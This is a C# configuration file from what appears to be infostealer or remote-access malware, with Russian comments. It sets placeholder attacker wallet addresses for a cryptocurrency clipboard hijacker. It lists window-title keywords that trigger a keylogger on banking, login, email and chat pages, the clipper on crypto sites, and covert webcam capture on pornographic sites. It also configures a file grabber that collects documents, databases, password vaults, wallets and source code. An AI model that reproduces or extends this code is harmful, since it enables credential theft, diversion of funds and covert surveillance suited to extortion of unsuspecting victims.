﻿using System.Collections.Generic;

namespace Client.Modules
{
    internal sealed class Config
    {

        // Clipper addresses:
        public static Dictionary<string, string> ClipperAddresses = new Dictionary<string, string>() // Адреса для замены
        {
            {"btc", "--- ClipperBTC ---" }, // Bitcoin
            {"eth", "--- ClipperETH ---" }, // Ethereum
            {"xmr", "--- ClipperXMR ---" }, // Monero
            {"xlm", "--- ClipperXLM ---" }, // Stellar
            {"xrp", "--- ClipperXRP ---" }, // Ripple
            {"ltc", "--- ClipperLTC ---" }, // Litecoin
            {"bch", "--- ClipperBCH ---" }, // Bitcoin Cash
        };

        // Start keylogger when active window title contains this text:
        public static string[] KeyloggerServices = new string[]
        {
            "facebook", "twitter",
            "chat", "telegram", "skype", "discord", "viber", "message",
            "gmail", "protonmail", "outlook",
            "password", "encryption", "account", "login", "key", "sign in", "пароль",
            "bank", "банк", "credit", "card", "кредит",
            "shop", "buy", "sell", "купить",
        };

        public static string[] BankingServices = new string[] {
            "qiwi", "money", "exchange",
            "bank",  "credit", "card", "банк", "кредит",
        };

        // Start clipper when active window title contains this text:
        public static string[] CryptoServices = new string[] {
            "bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin",
            "btc", "eth", "xmr", "xlm", "xrp", "ltc", "bch",
            "blockchain", "paxful", "investopedia", "buybitcoinworldwide",
            "cryptocurrency", "crypto", "trade", "trading", "биткоин", "wallet"
        };

        // Start webcam capture when active window title contains this text:
        public static string[] PornServices = new string[] {
            "porn", "sex", "hentai", "порно", "sex"
        };

        // File grabber max size:
        public static int GrabberSizeLimit = 5120; // 5MB

        // Grabber file types:
        public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
        {
            ["Document"] = new string[] { "pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "json" },
            ["DataBase"] = new string[] { "db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini" },
            ["SourceCode"] = new string[] { "c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino" },
            ["Image"] = new string[] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" },
        };
    }
}